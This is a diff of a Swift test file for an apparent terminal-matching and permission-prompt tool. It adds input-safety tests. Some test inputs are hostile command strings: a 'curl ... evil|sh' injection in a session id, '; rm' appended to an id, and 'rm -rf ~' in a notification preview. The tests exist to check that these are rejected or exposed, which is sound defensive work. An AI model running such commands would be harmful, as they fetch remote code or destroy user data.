@@ -135,28 +135,99 @@ func navTests() {
 }
 
 func terminalTests() {
-    let out = "T1\t✳ Fix bug\t/p/app\nT2\t⠂ Other\t/p/app\nT3\tzsh\t/p/app\nbad line\nT4\t◐ Fix bug\t/p/other\n"
+    let fs = TerminalMatch.fieldSeparator, rs = TerminalMatch.recordSeparator
+    let rows = [["T1", "✳ Fix bug", "/p/app"], ["T2", "⠂ Other", "/p/app"], ["T3", "zsh", "/p/app"],
+                ["T4", "◐ Fix bug", "/p/other"], ["T5", "✳ Fix bug", "/p/dup"], ["T6", "✶ Fix bug", "/p/dup"],
+                ["T7", "* vim", "/p/star"]]
+    let out = rows.map { $0.joined(separator: fs) }.joined(separator: rs) + rs + "bad" + rs
     let terms = TerminalMatch.parse(out)
-    test("parse skips malformed lines") {
-        expectEqual(terms.map(\.id), ["T1", "T2", "T3", "T4"])
+    test("parse uses separators titles can't contain, and skips malformed records") {
+        expectEqual(terms.map(\.id), ["T1", "T2", "T3", "T4", "T5", "T6", "T7"])
         expectEqual(terms[0], GhosttyTerminal(id: "T1", name: "✳ Fix bug", workingDirectory: "/p/app"))
+        // A tab or newline in a title no longer splits it into a fake row.
+        let tricky = TerminalMatch.parse("A\(fs)evil\ttitle\nB\tX\t/p\(fs)/p/app\(rs)")
+        expectEqual(tricky.count, 1)
     }
     test("claude titles") {
         expect(TerminalMatch.isClaudeTitle("✳ x"))
         expect(TerminalMatch.isClaudeTitle("⠂ x"))
+        expect(!TerminalMatch.isClaudeTitle("* vim"), "* is used by shells and editors")
         expect(!TerminalMatch.isClaudeTitle("zsh"))
         expect(!TerminalMatch.isClaudeTitle(""))
         expectEqual(TerminalMatch.strippedTitle("◐ ✳  Fix bug"), "Fix bug")
         expect(!TerminalMatch.isBraille(Character("a")))
     }
-    test("find by title + folder, by unique title, by unique folder") {
+    test("find always requires the session's folder, and refuses ambiguity") {
         expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Fix bug"), in: terms)?.id, "T1")
-        expectEqual(TerminalMatch.find(for: session("s", cwd: "/elsewhere", title: "Other"), in: terms)?.id, "T2")
-        // Title matches two terminals in other folders: ambiguous, then folder has 2 Claude terminals: none.
-        expect(TerminalMatch.find(for: session("s", cwd: "/x", title: "Fix bug"), in: terms) == nil)
+        // A terminal elsewhere with the same title is never picked (titles can be spoofed).
+        expect(TerminalMatch.find(for: session("s", cwd: "/elsewhere", title: "Other"), in: terms) == nil)
+        // Two Claude terminals in the folder, title doesn't single one out: refuse.
+        expect(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Nope"), in: terms) == nil)
+        expect(TerminalMatch.find(for: session("s", cwd: "/p/dup", title: "Fix bug"), in: terms) == nil)
+        // The only Claude terminal in the folder.
         expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/other", title: nil), in: terms)?.id, "T4")
         expectEqual(TerminalMatch.find(for: session("s", cwd: "/p/other", title: ""), in: terms)?.id, "T4")
-        expect(TerminalMatch.find(for: session("s", cwd: "/p/app", title: "Nope"), in: terms) == nil)
+        expect(TerminalMatch.find(for: session("s", cwd: "/p/star"), in: terms) == nil)
+    }
+    test("still matches") {
+        let s = session("s", cwd: "/p/app")
+        expect(TerminalMatch.stillMatches(terms[0], session: s))
+        expect(!TerminalMatch.stillMatches(terms[2], session: s), "now a shell")
+        expect(!TerminalMatch.stillMatches(terms[3], session: s), "other folder")
+    }
+}
+
+func safetyTests() {
+    test("session ids") {
+        expect(Safety.isSessionId("904d7e05-e5d3-4b07-97e8-5d5358ca80c4"))
+        expect(!Safety.isSessionId("x;curl${IFS}evil|sh"))
+        expect(!Safety.isSessionId("904d7e05-e5d3-4b07-97e8-5d5358ca80c4; rm"))
+    }
+    test("shell quoting") {
+        expectEqual(Safety.shellQuote("plain"), "'plain'")
+        expectEqual(Safety.shellQuote("it's $(x)"), #"'it'\''s $(x)'"#)
+    }
+    test("control characters") {
+        expectEqual(Safety.stripControls("a\u{1b}[201~b\u{7f}c\u{85}d\n\te"), "a[201~bcd\n\te")
+        expectEqual(Safety.stripControls("a\nb\tc", keepNewlines: false), "abc")
+    }
+    test("typed text encoding") {
+        expectEqual(Safety.typedTextAction("say \"hi\" \\ ok\nline 2\tx\u{1b}"), #"text:say "hi" \\ ok\nline 2    x"#)
+        expectEqual(Safety.typedTextAction(""), "text:")
+    }
+    test("prompt guard: typing and answering") {
+        func rec(_ status: String?, since: Double? = nil) -> SessionRecord {
+            SessionRecord(pid: 1, sessionId: "s", cwd: "/", startedAt: nil, kind: nil, name: nil, status: status,
+                          waitingFor: nil, updatedAt: nil, statusUpdatedAt: since, detail: nil)
+        }
+        expect(PromptGuard.canType(rec("idle")))
+        expect(PromptGuard.canType(rec("busy")))
+        expect(!PromptGuard.canType(rec("waiting")))
+        expect(!PromptGuard.canType(nil))
+        expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: 1000.0004))
+        expect(PromptGuard.canAnswer(rec("waiting", since: 1000), expectedSince: nil))
+        expect(!PromptGuard.canAnswer(rec("waiting", since: 2000), expectedSince: 1000), "a newer prompt")
+        expect(!PromptGuard.canAnswer(rec("waiting"), expectedSince: 1000))
+        expect(!PromptGuard.canAnswer(rec("busy", since: 1000), expectedSince: 1000), "already answered")
+        expect(!PromptGuard.canAnswer(nil, expectedSince: nil))
+    }
+    test("one-click answers only for known, standard dialogs") {
+        let bash = ToolCall(id: "1", name: "Bash", summary: "ls")
+        expect(PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt", pendingTool: bash)))
+        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt")), "unknown request")
+        let plan = ToolCall(id: "2", name: "ExitPlanMode", summary: "")
+        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "permission prompt", pendingTool: plan)))
+        expect(!PromptGuard.canAnswerHere(session("a", status: .waiting, waitingFor: "question", pendingTool: bash)))
+        expect(PromptGuard.hasStandardDialog("mcp__x__y"))
+    }
+    test("status stamp round-trips") {
+        let s = session("a", statusSince: Date(timeIntervalSince1970: 1_790_823_787.320))
+        expect(abs(s.statusStamp! - 1_790_823_787_320) < 1)
+        expect(session("b").statusStamp == nil)
+    }
+    test("project folders: unique, running first") {
+        let live = [session("a", cwd: "/x"), session("b", cwd: "/y")], recent = [session("c", cwd: "/x"), session("d", cwd: "/z")]
+        expectEqual(SessionNav.projectFolders(live: live, recent: recent), ["/x", "/y", "/z"])
     }
 }
 
@@ -238,6 +309,11 @@ func exportTests() {
 }
 
 func notificationTests() {
+    test("previews can't hide content") {
+        expectEqual(NotificationText.preview("ls\nrm -rf ~"), "ls ⏎ rm -rf ~")
+        let long = String(repeating: "a", count: 300)
+        expect(NotificationText.preview(long).hasSuffix("… (300 chars)"))
+    }
     test("with a captured tool") {
         let t = NotificationText(for: session("a", status: .waiting, cwd: "/p/app", title: "Fix", waitingFor: "permission prompt",
                                               pendingTool: ToolCall(id: "1", name: "mcp__srv__do_thing", summary: "go")))
